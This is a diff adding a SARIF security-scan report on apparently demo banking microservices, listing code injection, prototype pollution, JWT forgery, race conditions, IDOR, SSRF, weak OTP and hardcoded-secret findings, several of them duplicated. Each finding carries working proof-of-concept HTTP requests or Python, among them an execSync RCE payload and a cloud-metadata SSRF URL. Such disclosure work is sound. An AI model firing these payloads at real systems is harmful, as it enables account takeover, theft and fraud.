@@ -1,0 +1,416 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "CodeMender",
+          "version": "dev"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CODE INJECTION",
+          "level": "error",
+          "message": {
+            "text": "Remote Code Execution via Function Constructor in Custom Rate Formula Evaluation: Data Path Analysis:\n- Source: In `services/credit-service/src/index.js`, the endpoint `POST /api/v1/credit/proposals/:id/evaluate-formula` parses incoming JSON payload without authentication and extracts `body.formula`.\n- Sanitization/Validation: `evaluateCustomRateFormula` only verifies `if (!formula || typeof formula !== 'string')`. There is no sandboxing, AST parsing, or whitelist of allowable mathematical operations.\n- Sink: At line 60 of `contract_engine.js`, the untrusted string is interpolated directly into `new Function('amount', 'term', 'score', `return (${formula});`)` and immediately invoked.\n\nConceptual Exploit Payload:\nSend an HTTP POST request to evaluate a custom formula containing arbitrary Node.js code execution:\n```http\nPOST /api/v1/credit/proposals/prop_101/evaluate-formula HTTP/1.1\nHost: localhost:8084\nContent-Type: application/json\n\n{\n  \"formula\": \"process.mainModule.require('child_process').execSync('id').toString()\",\n  \"context\": {\n    \"amount\": 1000,\n    \"term\": 12,\n    \"score\": 750\n  }\n}\n```\nThe constructor runs the injected JavaScript in the current process context, leading to Remote Code Execution (RCE)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/credit-service/src/services/contract_engine.js"
+                },
+                "region": {
+                  "startLine": 59,
+                  "endLine": 61
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Code Injection",
+          "level": "error",
+          "message": {
+            "text": "Remote Code Execution via Function Constructor in Custom Rate Formula Evaluation: Data Path Analysis:\n- Source: In `services/credit-service/src/index.js`, the endpoint `POST /api/v1/credit/proposals/:id/evaluate-formula` parses incoming JSON payload without authentication and extracts `body.formula`.\n- Sanitization/Validation: `evaluateCustomRateFormula` only verifies `if (!formula || typeof formula !== 'string')`. There is no sandboxing, AST parsing, or whitelist of allowable mathematical operations.\n- Sink: At line 60 of `contract_engine.js`, the untrusted string is interpolated directly into `new Function('amount', 'term', 'score', `return (${formula});`)` and immediately invoked.\n\nConceptual Exploit Payload:\nSend an HTTP POST request to evaluate a custom formula containing arbitrary Node.js code execution:\n```http\nPOST /api/v1/credit/proposals/prop_101/evaluate-formula HTTP/1.1\nHost: localhost:8084\nContent-Type: application/json\n\n{\n  \"formula\": \"process.mainModule.require('child_process').execSync('id').toString()\",\n  \"context\": {\n    \"amount\": 1000,\n    \"term\": 12,\n    \"score\": 750\n  }\n}\n```\nThe constructor runs the injected JavaScript in the current process context, leading to Remote Code Execution (RCE)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/credit-service/src/services/contract_engine.js"
+                },
+                "region": {
+                  "startLine": 59,
+                  "endLine": 61
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "PROTOTYPE POLLUTION",
+          "level": "error",
+          "message": {
+            "text": "Prototype Pollution via Unsanitized Object Key Recursion in deepMerge: Data Path Analysis:\n- Source: In `services/identity-service/src/index.js`, the endpoint `PATCH /api/v1/customers/:id/profile` receives untrusted JSON updates from the request body and forwards them to `customerStore.updateProfile(customerId, body)`.\n- Sanitization/Validation: `deepMerge` does not filter dangerous keys such as `__proto__`, `constructor`, or `prototype`.\n- Sink: When `key` is `\"__proto__\"`, accessing `target[key]` evaluates to `Object.prototype`. The recursive call `deepMerge(target[key], val)` then assigns properties directly onto `Object.prototype` at line 18 (`target[key] = val`), polluting global prototype properties across the Node.js runtime.\n\nConceptual Exploit Payload:\nSend an HTTP PATCH request with a crafted JSON payload targeting `__proto__`:\n```http\nPATCH /api/v1/customers/cust_001/profile HTTP/1.1\nHost: localhost:8082\nContent-Type: application/json\n\n{\n  \"__proto__\": {\n    \"polluted\": true,\n    \"isAdmin\": true\n  }\n}\n```\nFollowing this request, `({}).polluted === true` and `({}).isAdmin === true` in the application environment, allowing authorization bypass, denial of service, or further exploitation."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/identity-service/src/utils/merge.js"
+                },
+                "region": {
+                  "startLine": 10,
+                  "endLine": 20
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "IMPROPER VERIFICATION OF CRYPTOGRAPHIC SIGNATURE",
+          "level": "error",
+          "message": {
+            "text": "JWT Key Confusion / Algorithm Confusion Vulnerability (RS256 to HS256): Data Path Analysis:\n- Source: Route `POST /api/v1/auth/verify` receives `body.token` from untrusted client HTTP requests and passes it to `jwtService.verifyToken(body.token)`.\n- Sanitization/Validation: `verifyToken` decodes `header.alg` directly from the untrusted token without enforcing an expected algorithm whitelist or restricting tokens to asymmetric RS256 signatures.\n- Sink: At lines 63-70, if `header.alg === 'HS256'`, the service verifies the token using `crypto.createHmac('sha256', this.publicKeyPEM)`, treating the public RSA PEM key string as the HMAC secret key. An attacker who obtains or knows the public key can craft and sign arbitrary tokens with HS256, forging any claims/roles (e.g. elevating privileges to enterprise admin) that pass signature verification.\n\nConceptual Exploit Payload:\n1. Construct a header with `\"alg\": \"HS256\"`, `\"typ\": \"JWT\"`.\n2. Construct payload with arbitrary claims:\n```json\n{\n  \"sub\": \"cust_001\",\n  \"name\": \"Attacker\",\n  \"tier\": \"TIER_ENTERPRISE\",\n  \"role\": \"admin\",\n  \"exp\": 1999999999\n}\n```\n3. Sign `base64url(header) + \".\" + base64url(payload)` using HMAC-SHA256 with the server's public key string as the HMAC key.\n4. Send verification request:\n```http\nPOST /api/v1/auth/verify HTTP/1.1\nHost: localhost:8082\nContent-Type: application/json\n\n{\n  \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\u003cbase64url_payload\u003e.\u003cforged_hmac_signature\u003e\"\n}\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/identity-service/src/services/jwt_service.js"
+                },
+                "region": {
+                  "startLine": 63,
+                  "endLine": 70
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CONCURRENT EXECUTION USING SHARED RESOURCE WITH IMPROPER SYNCHRONIZATION",
+          "level": "error",
+          "message": {
+            "text": "Concurrency Race Condition (TOCTOU) Allowing Double-Spending in Account Debit: Data Path Analysis:\n- Source: HTTP POST endpoint `/api/v1/accounts/debit` handled in `services/core-banking/internal/handler/http.go:HandleDebit` reads JSON input (`accountId`, `amount`, `description`, `referenceId`) and calls `bankingSvc.Debit()`.\n- Sanitization/Validation: At lines 97-100, the method checks `if acc.Balance \u003c amount`. However, this read-and-check operation is performed without acquiring a mutex or performing an atomic database compare-and-swap / transaction isolation lock.\n- Sink: At line 103, an artificial ledger delay `time.Sleep(15 * time.Millisecond)` occurs between reading the balance and updating it (`newBalance := acc.Balance - amount`, `s.repo.UpdateAccount(acc)`). Because Go's HTTP server handles each request in a concurrent goroutine, multiple requests sent in parallel can pass the liquidity check before any one request commits the deducted balance, causing double-spending and draining account balances beyond allowed limits.\n\nConceptual Exploit Payload:\nSend two or more concurrent HTTP requests in parallel for an account with balance 1250.00:\n```http\nPOST /api/v1/accounts/debit HTTP/1.1\nHost: localhost:8081\nContent-Type: application/json\n\n{\n  \"accountId\": \"acc_1002\",\n  \"amount\": 1000.0,\n  \"description\": \"Exploit Debit 1\",\n  \"referenceId\": \"ref_race_1\"\n}\n```\nand concurrently:\n```http\nPOST /api/v1/accounts/debit HTTP/1.1\nHost: localhost:8081\nContent-Type: application/json\n\n{\n  \"accountId\": \"acc_1002\",\n  \"amount\": 1000.0,\n  \"description\": \"Exploit Debit 2\",\n  \"referenceId\": \"ref_race_2\"\n}\n```\nBoth goroutines observe `acc.Balance == 1250.0 \u003e= 1000.0` during the 15ms window, and both proceed to debit, resulting in a total of 2000.0 debited from an account holding only 1250.0."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/core-banking/internal/service/banking.go"
+                },
+                "region": {
+                  "startLine": 96,
+                  "endLine": 111
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "AUTHORIZATION BYPASS THROUGH USER-CONTROLLED KEY",
+          "level": "error",
+          "message": {
+            "text": "Broken Object Level Authorization (BOLA/IDOR) in Account Statement Generation: Data Path Analysis:\n- Source: Route `GET /api/v1/accounts/{id}/statement` receives the target account ID from the URL path and tenant identity from the `X-Customer-ID` request header.\n- Sanitization/Validation: Although `customerID` is extracted in `HandleGetStatement` and passed into `GetStatement(customerID, accountID)`, `GetStatement` never checks `acc.CustomerID == customerID`.\n- Sink: The method queries the repository for the account (`s.repo.GetAccountByID(accountID)`) and returns all transaction entries and balances for that account. Additionally, `statementCache` uses a global key `fmt.Sprintf(\"stmt:%s\", accountID)` completely lacking customer/tenant scoping. Any caller with access to the API can inspect statements and sensitive financial records belonging to any other customer/tenant.\n\nConceptual Exploit Payload:\nAn unprivileged user (`cust_001` or `cust_002`) sends a request for corporate account `acc_1003` (belonging to `cust_003`):\n```http\nGET /api/v1/accounts/acc_1003/statement HTTP/1.1\nHost: localhost:8081\nX-Customer-ID: cust_001\n```\nThe server returns 200 OK with the full transaction ledger and account balance (1,500,000.00 BRL) belonging to `cust_003`."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/core-banking/internal/service/banking.go"
+                },
+                "region": {
+                  "startLine": 135,
+                  "endLine": 149
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "IMPROPER ENFORCEMENT OF BEHAVIORAL WORKFLOW",
+          "level": "error",
+          "message": {
+            "text": "Missing State Machine Transition Guard in Credit Proposal Lifecycle: Data Path Analysis:\n- Source: In `services/credit-service/src/index.js`, route `PATCH /api/v1/credit/proposals/:id/status` accepts JSON input with `body.status` and `body.reason` and invokes `proposalStore.updateStatus(id, body.status, body.reason)`.\n- Sanitization/Validation: `updateStatus` only checks `if (proposal.status === 'CANCELLED')`. It contains no state-machine transition guard validation to enforce that a proposal must progress from `DRAFT` -\u003e `ANALYSIS_PENDING` -\u003e `APPROVED` -\u003e `CONTRACT_SIGNED` before reaching `DISBURSEMENT_READY`.\n- Sink: Lines 119-126 overwrite `proposal.status = newStatus` and persist it. A borrower or unauthenticated caller can arbitrarily transition a brand new or unapproved credit proposal straight to `DISBURSEMENT_READY`, bypassing underwriting and credit committee approval.\n\nConceptual Exploit Payload:\nSend an HTTP PATCH request to update the status of a pending proposal:\n```http\nPATCH /api/v1/credit/proposals/prop_102/status HTTP/1.1\nHost: localhost:8084\nContent-Type: application/json\n\n{\n  \"status\": \"DISBURSEMENT_READY\",\n  \"reason\": \"Bypassed underwriting checks\"\n}\n```\nThe server accepts the transition and returns status 200 with `status: \"DISBURSEMENT_READY\"`, qualifying the proposal for immediate loan disbursement."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/credit-service/src/services/proposal_store.js"
+                },
+                "region": {
+                  "startLine": 114,
+                  "endLine": 127
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "USE OF CRYPTOGRAPHICALLY WEAK PSEUDO-RANDOM NUMBER GENERATOR (PRNG)",
+          "level": "error",
+          "message": {
+            "text": "Predictable Seed and Weak PRNG in Step-Up OTP Challenge Generator: Data Path Analysis:\n- Source: Route `POST /api/v1/risk/challenge` receives `accountId` and `transactionRef` to generate a 2FA step-up challenge OTP.\n- Sanitization/Validation: None.\n- Sink: Lines 19-21 seed the non-cryptographic `random` module with `int(time.time())`, resetting the PRNG state based on the current Unix epoch second. Because an attacker knows or can observe the approximate HTTP request arrival time (e.g., from the server's HTTP `Date` header), they can predict the exact seed `now_ts` and calculate `otp_code = str(random.randint(100000, 999999))` without access to the user's out-of-band communication channel. The attacker can then submit this predicted OTP to `POST /api/v1/risk/verify-challenge`, bypassing step-up anti-fraud protection for high-risk operations.\n\nConceptual Exploit Payload:\n1. Trigger OTP challenge:\n```http\nPOST /api/v1/risk/challenge HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\n\n{\n  \"accountId\": \"acc_1001\",\n  \"transactionRef\": \"pay_pix_901\"\n}\n```\nReceive response: `{\"challengeId\": \"chal_abcd1234ef56\", ...}`.\n2. Locally calculate candidate OTPs using `int(time.time())` at request time:\n```python\nimport random, time\nnow = int(time.time())\nrandom.seed(now)\npredicted_otp = str(random.randint(100000, 999999))\n```\n3. Submit the predicted OTP:\n```http\nPOST /api/v1/risk/verify-challenge HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\n\n{\n  \"challengeId\": \"chal_abcd1234ef56\",\n  \"otpCode\": \"\u003cpredicted_otp\u003e\"\n}\n```\nThe server verifies the challenge, authorizing fraudulent high-value transactions."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/risk-engine/app/engine/otp.py"
+                },
+                "region": {
+                  "startLine": 17,
+                  "endLine": 21
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "USE OF HARD-CODED CREDENTIALS",
+          "level": "error",
+          "message": {
+            "text": "Hardcoded Default Cryptographic Secret Fallback for Partner HMAC Authentication: Data Path Analysis:\n- Source: Route `POST /api/v1/risk/partner-verify` receives HTTP request body and incoming HMAC signature from `X-Partner-Signature` header.\n- Sanitization/Validation: In `auth.py`, if the `PARTNER_HMAC_SECRET` environment variable is not explicitly supplied in the deployment configuration, the verifier falls back to the static string `\"cymbal_default_internal_sec_2026\"`.\n- Sink: At lines 12-14, the hardcoded fallback secret is used by `hmac.new(self.secret_key, payload, hashlib.sha256).hexdigest()` to authenticate partner API requests. Additionally, at line 24, signatures are compared with standard Python equality (`expected == incoming_signature`) instead of constant-time comparison `hmac.compare_digest`, introducing an observable timing discrepancy (CWE-208). Any attacker knowing the public/decompiled default secret can forge valid HMAC signatures to impersonate trusted partners.\n\nConceptual Exploit Payload:\nCompute the HMAC-SHA256 of any arbitrary partner verification payload using the fallback key:\n```python\nimport hmac, hashlib\npayload = b'{\"action\": \"authorize_bypass\", \"accountId\": \"acc_1001\"}'\nsecret = b'cymbal_default_internal_sec_2026'\nsig = hmac.new(secret, payload, hashlib.sha256).hexdigest()\n```\nSend request:\n```http\nPOST /api/v1/risk/partner-verify HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\nX-Partner-Signature: \u003csig\u003e\n\n{\"action\": \"authorize_bypass\", \"accountId\": \"acc_1001\"}\n```\nThe server validates the signature and returns `{\"valid\": true, \"message\": \"Signature verified\"}`."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/risk-engine/app/engine/auth.py"
+                },
+                "region": {
+                  "startLine": 11,
+                  "endLine": 15
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "SERVER-SIDE REQUEST FORGERY (SSRF)",
+          "level": "error",
+          "message": {
+            "text": "Incomplete Blacklist Validation Leading to Server-Side Request Forgery (SSRF) in Webhooks: Data Path Analysis:\n- Source: In `services/payments-service/main.py`, route `POST /api/v1/webhooks/register` accepts JSON input with `merchantId` and `callbackUrl`, and registers the webhook via `webhook_dispatcher.register_endpoint(merchant_id, callback_url)`.\n- Sanitization/Validation: `is_safe_callback_url` only checks if `parsed.scheme in ('http', 'https')` and tests `hostname.lower() in {\"localhost\", \"127.0.0.1\"}`.\n- Sink: Lines 35-41 only check a naive, static blacklist of two hostnames. It omits DNS resolution checks, private IPv4/IPv6 address filtering (RFC 1918 subnets like 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, or IPv6 ::1), and cloud link-local metadata endpoints (`169.254.169.254`). Consequently, attackers can register internal cloud metadata service URLs or private network addresses, enabling Server-Side Request Forgery (SSRF) when event notifications are dispatched.\n\nConceptual Exploit Payload:\nRegister a webhook targeting the cloud metadata service:\n```http\nPOST /api/v1/webhooks/register HTTP/1.1\nHost: localhost:8083\nContent-Type: application/json\n\n{\n  \"merchantId\": \"merch_attacker\",\n  \"callbackUrl\": \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\"\n}\n```\nThe server validates the URL with `is_safe_callback_url`, passes the check because `169.254.169.254` is not `localhost` or `127.0.0.1`, and registers the endpoint with HTTP 201 Created."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/payments-service/app/services/webhook_dispatcher.py"
+                },
+                "region": {
+                  "startLine": 35,
+                  "endLine": 41
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CONCURRENT EXECUTION USING SHARED RESOURCE WITH IMPROPER SYNCHRONIZATION",
+          "level": "error",
+          "message": {
+            "text": "Check-Then-Set Race Condition in Payment Idempotency Processing: Data Path Analysis:\n- Source: In `services/payments-service/main.py`, endpoint `POST /api/v1/payments/pix` receives `Idempotency-Key` via request headers or JSON payload and passes it to `payment_svc.process_pix_payment`.\n- Sanitization/Validation: At line 85, the service checks whether the key exists in the cache (`cached = self.idempotency_mgr.get_record(idempotency_key)`). However, no lock is acquired, and the transaction is not reserved or locked in a \"PENDING/PROCESSING\" state before external settlement.\n- Sink: Lines 104-130: After the check, execution delays for downstream rail simulation (`time.sleep(0.01)`), and the record is only committed to the idempotency store *after* the payment settlement finishes. If two concurrent payment requests arrive with the same `Idempotency-Key`, both find the key unset in cache, both proceed to execute payment settlement, and both produce separate settled transaction orders (`pay_...`), defeating the idempotency guarantee.\n\nConceptual Exploit Payload:\nSend two parallel requests with the identical `Idempotency-Key`:\n```http\nPOST /api/v1/payments/pix HTTP/1.1\nHost: localhost:8083\nContent-Type: application/json\nIdempotency-Key: idem_race_attack_01\n\n{\n  \"sourceAccountId\": \"acc_1001\",\n  \"pixKey\": \"merchant@store.com\",\n  \"amount\": 500.0,\n  \"description\": \"Payment\"\n}\n```\nDue to the check-then-set race window between lines 85 and 130, both requests execute settlement independently, creating two distinct payment orders and double-charging the account."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/payments-service/app/services/payment_service.py"
+                },
+                "region": {
+                  "startLine": 83,
+                  "endLine": 130
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Concurrent Execution using Shared Resource with Improper Synchronization",
+          "level": "error",
+          "message": {
+            "text": "Check-Then-Set Race Condition in Payment Idempotency Processing: Data Path Analysis:\n- Source: In `services/payments-service/main.py`, endpoint `POST /api/v1/payments/pix` receives `Idempotency-Key` via request headers or JSON payload and passes it to `payment_svc.process_pix_payment`.\n- Sanitization/Validation: At line 85, the service checks whether the key exists in the cache (`cached = self.idempotency_mgr.get_record(idempotency_key)`). However, no lock is acquired, and the transaction is not reserved or locked in a \"PENDING/PROCESSING\" state before external settlement.\n- Sink: Lines 104-130: After the check, execution delays for downstream rail simulation (`time.sleep(0.01)`), and the record is only committed to the idempotency store *after* the payment settlement finishes. If two concurrent payment requests arrive with the same `Idempotency-Key`, both find the key unset in cache, both proceed to execute payment settlement, and both produce separate settled transaction orders (`pay_...`), defeating the idempotency guarantee.\n\nConceptual Exploit Payload:\nSend two parallel requests with the identical `Idempotency-Key`:\n```http\nPOST /api/v1/payments/pix HTTP/1.1\nHost: localhost:8083\nContent-Type: application/json\nIdempotency-Key: idem_race_attack_01\n\n{\n  \"sourceAccountId\": \"acc_1001\",\n  \"pixKey\": \"merchant@store.com\",\n  \"amount\": 500.0,\n  \"description\": \"Payment\"\n}\n```\nDue to the check-then-set race window between lines 85 and 130, both requests execute settlement independently, creating two distinct payment orders and double-charging the account."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/payments-service/app/services/payment_service.py"
+                },
+                "region": {
+                  "startLine": 83,
+                  "endLine": 130
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Server-Side Request Forgery (SSRF)",
+          "level": "error",
+          "message": {
+            "text": "Incomplete Blacklist Validation Leading to Server-Side Request Forgery (SSRF) in Webhooks: Data Path Analysis:\n- Source: In `services/payments-service/main.py`, route `POST /api/v1/webhooks/register` accepts JSON input with `merchantId` and `callbackUrl`, and registers the webhook via `webhook_dispatcher.register_endpoint(merchant_id, callback_url)`.\n- Sanitization/Validation: `is_safe_callback_url` only checks if `parsed.scheme in ('http', 'https')` and tests `hostname.lower() in {\"localhost\", \"127.0.0.1\"}`.\n- Sink: Lines 35-41 only check a naive, static blacklist of two hostnames. It omits DNS resolution checks, private IPv4/IPv6 address filtering (RFC 1918 subnets like 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, or IPv6 ::1), and cloud link-local metadata endpoints (`169.254.169.254`). Consequently, attackers can register internal cloud metadata service URLs or private network addresses, enabling Server-Side Request Forgery (SSRF) when event notifications are dispatched.\n\nConceptual Exploit Payload:\nRegister a webhook targeting the cloud metadata service:\n```http\nPOST /api/v1/webhooks/register HTTP/1.1\nHost: localhost:8083\nContent-Type: application/json\n\n{\n  \"merchantId\": \"merch_attacker\",\n  \"callbackUrl\": \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\"\n}\n```\nThe server validates the URL with `is_safe_callback_url`, passes the check because `169.254.169.254` is not `localhost` or `127.0.0.1`, and registers the endpoint with HTTP 201 Created."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/payments-service/app/services/webhook_dispatcher.py"
+                },
+                "region": {
+                  "startLine": 35,
+                  "endLine": 41
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Use of Hard-coded Credentials",
+          "level": "error",
+          "message": {
+            "text": "Hardcoded Default Cryptographic Secret Fallback for Partner HMAC Authentication: Data Path Analysis:\n- Source: Route `POST /api/v1/risk/partner-verify` receives HTTP request body and incoming HMAC signature from `X-Partner-Signature` header.\n- Sanitization/Validation: In `auth.py`, if the `PARTNER_HMAC_SECRET` environment variable is not explicitly supplied in the deployment configuration, the verifier falls back to the static string `\"cymbal_default_internal_sec_2026\"`.\n- Sink: At lines 12-14, the hardcoded fallback secret is used by `hmac.new(self.secret_key, payload, hashlib.sha256).hexdigest()` to authenticate partner API requests. Additionally, at line 24, signatures are compared with standard Python equality (`expected == incoming_signature`) instead of constant-time comparison `hmac.compare_digest`, introducing an observable timing discrepancy (CWE-208). Any attacker knowing the public/decompiled default secret can forge valid HMAC signatures to impersonate trusted partners.\n\nConceptual Exploit Payload:\nCompute the HMAC-SHA256 of any arbitrary partner verification payload using the fallback key:\n```python\nimport hmac, hashlib\npayload = b'{\"action\": \"authorize_bypass\", \"accountId\": \"acc_1001\"}'\nsecret = b'cymbal_default_internal_sec_2026'\nsig = hmac.new(secret, payload, hashlib.sha256).hexdigest()\n```\nSend request:\n```http\nPOST /api/v1/risk/partner-verify HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\nX-Partner-Signature: \u003csig\u003e\n\n{\"action\": \"authorize_bypass\", \"accountId\": \"acc_1001\"}\n```\nThe server validates the signature and returns `{\"valid\": true, \"message\": \"Signature verified\"}`."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/risk-engine/app/engine/auth.py"
+                },
+                "region": {
+                  "startLine": 11,
+                  "endLine": 15
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
+          "level": "error",
+          "message": {
+            "text": "Predictable Seed and Weak PRNG in Step-Up OTP Challenge Generator: Data Path Analysis:\n- Source: Route `POST /api/v1/risk/challenge` receives `accountId` and `transactionRef` to generate a 2FA step-up challenge OTP.\n- Sanitization/Validation: None.\n- Sink: Lines 19-21 seed the non-cryptographic `random` module with `int(time.time())`, resetting the PRNG state based on the current Unix epoch second. Because an attacker knows or can observe the approximate HTTP request arrival time (e.g., from the server's HTTP `Date` header), they can predict the exact seed `now_ts` and calculate `otp_code = str(random.randint(100000, 999999))` without access to the user's out-of-band communication channel. The attacker can then submit this predicted OTP to `POST /api/v1/risk/verify-challenge`, bypassing step-up anti-fraud protection for high-risk operations.\n\nConceptual Exploit Payload:\n1. Trigger OTP challenge:\n```http\nPOST /api/v1/risk/challenge HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\n\n{\n  \"accountId\": \"acc_1001\",\n  \"transactionRef\": \"pay_pix_901\"\n}\n```\nReceive response: `{\"challengeId\": \"chal_abcd1234ef56\", ...}`.\n2. Locally calculate candidate OTPs using `int(time.time())` at request time:\n```python\nimport random, time\nnow = int(time.time())\nrandom.seed(now)\npredicted_otp = str(random.randint(100000, 999999))\n```\n3. Submit the predicted OTP:\n```http\nPOST /api/v1/risk/verify-challenge HTTP/1.1\nHost: localhost:8085\nContent-Type: application/json\n\n{\n  \"challengeId\": \"chal_abcd1234ef56\",\n  \"otpCode\": \"\u003cpredicted_otp\u003e\"\n}\n```\nThe server verifies the challenge, authorizing fraudulent high-value transactions."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/risk-engine/app/engine/otp.py"
+                },
+                "region": {
+                  "startLine": 17,
+                  "endLine": 21
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Improper Enforcement of Behavioral Workflow",
+          "level": "error",
+          "message": {
+            "text": "Missing State Machine Transition Guard in Credit Proposal Lifecycle: Data Path Analysis:\n- Source: In `services/credit-service/src/index.js`, route `PATCH /api/v1/credit/proposals/:id/status` accepts JSON input with `body.status` and `body.reason` and invokes `proposalStore.updateStatus(id, body.status, body.reason)`.\n- Sanitization/Validation: `updateStatus` only checks `if (proposal.status === 'CANCELLED')`. It contains no state-machine transition guard validation to enforce that a proposal must progress from `DRAFT` -\u003e `ANALYSIS_PENDING` -\u003e `APPROVED` -\u003e `CONTRACT_SIGNED` before reaching `DISBURSEMENT_READY`.\n- Sink: Lines 119-126 overwrite `proposal.status = newStatus` and persist it. A borrower or unauthenticated caller can arbitrarily transition a brand new or unapproved credit proposal straight to `DISBURSEMENT_READY`, bypassing underwriting and credit committee approval.\n\nConceptual Exploit Payload:\nSend an HTTP PATCH request to update the status of a pending proposal:\n```http\nPATCH /api/v1/credit/proposals/prop_102/status HTTP/1.1\nHost: localhost:8084\nContent-Type: application/json\n\n{\n  \"status\": \"DISBURSEMENT_READY\",\n  \"reason\": \"Bypassed underwriting checks\"\n}\n```\nThe server accepts the transition and returns status 200 with `status: \"DISBURSEMENT_READY\"`, qualifying the proposal for immediate loan disbursement."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/credit-service/src/services/proposal_store.js"
+                },
+                "region": {
+                  "startLine": 114,
+                  "endLine": 127
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Authorization Bypass Through User-Controlled Key",
+          "level": "error",
+          "message": {
+            "text": "Broken Object Level Authorization (BOLA/IDOR) in Account Statement Generation: Data Path Analysis:\n- Source: Route `GET /api/v1/accounts/{id}/statement` receives the target account ID from the URL path and tenant identity from the `X-Customer-ID` request header.\n- Sanitization/Validation: Although `customerID` is extracted in `HandleGetStatement` and passed into `GetStatement(customerID, accountID)`, `GetStatement` never checks `acc.CustomerID == customerID`.\n- Sink: The method queries the repository for the account (`s.repo.GetAccountByID(accountID)`) and returns all transaction entries and balances for that account. Additionally, `statementCache` uses a global key `fmt.Sprintf(\"stmt:%s\", accountID)` completely lacking customer/tenant scoping. Any caller with access to the API can inspect statements and sensitive financial records belonging to any other customer/tenant.\n\nConceptual Exploit Payload:\nAn unprivileged user (`cust_001` or `cust_002`) sends a request for corporate account `acc_1003` (belonging to `cust_003`):\n```http\nGET /api/v1/accounts/acc_1003/statement HTTP/1.1\nHost: localhost:8081\nX-Customer-ID: cust_001\n```\nThe server returns 200 OK with the full transaction ledger and account balance (1,500,000.00 BRL) belonging to `cust_003`."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "services/core-banking/internal/service/banking.go"
+                },
+                "region": {
+                  "startLine": 135,
+                  "endLine": 149
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "Concurrent Execution using Shared Resource with Improper Synchronization",
+          "level": "error",
+          "message": {
+            "text": "Concurrency Race Condition (TOCTOU) Allowing Double-Spending in Account Debit: Data Path Analysis:\n- Source: HTTP POST endpoint `/api/v1/accounts/debit` handled in `services/core-banking/internal/handler/http.go:HandleDebit` reads JSON input (`accountId`, `amount`, `description`, `referenceId`) and calls `bankingSvc.Debit()`.\n- Sanitization/Validation: At lines 97-100, the method checks `if acc.Balance \u003c amount`. However, this read-and-check operation is performed without acquiring a mutex or performing an atomic database compare-and-swap / transaction isolation lock.\n- Sink: At line 103, an artificial ledger delay `time.Sleep(15 * time.Millisecond)` occurs between reading the balance and updating it (`newBalance := acc.Balance - amount`, `s.repo.UpdateAccount(acc)`). Because Go's HTTP server handles each request in a concurrent goroutine, multiple requests sent in parallel can pass the liquidity check before any one request commits the deducted balance, causing double-spending and draining account balances beyond allowed limits.\n\nConceptual Exploit Payload:\nSend two or more concurrent HTTP requests in parallel for an account with balance 1250.00:\n```http\nPOST /api/v1/accounts/debit HTTP/1.1\nHost: localhost:8081\nContent-Type: application/json\n\n{\n  \"accountId\": \"acc_1002\",\n  \"amount\": 1000.0,\n  \"description\": \"Exploit Debit 1\",\n  \"referenceId\": \"ref_race_1\"\n}\n```\nand concurrently:\n```http\nPOST /api/v1/accounts/debit HTTP/1.1\nHost: localhost:8081\nContent-Type: application/json\n\n{\n  \"accountId\": \"acc_1002\",\n  \"amount\": 1000.0,\n  \"description\": \"Exploit Debit 2\",\n  \"referenceId\": 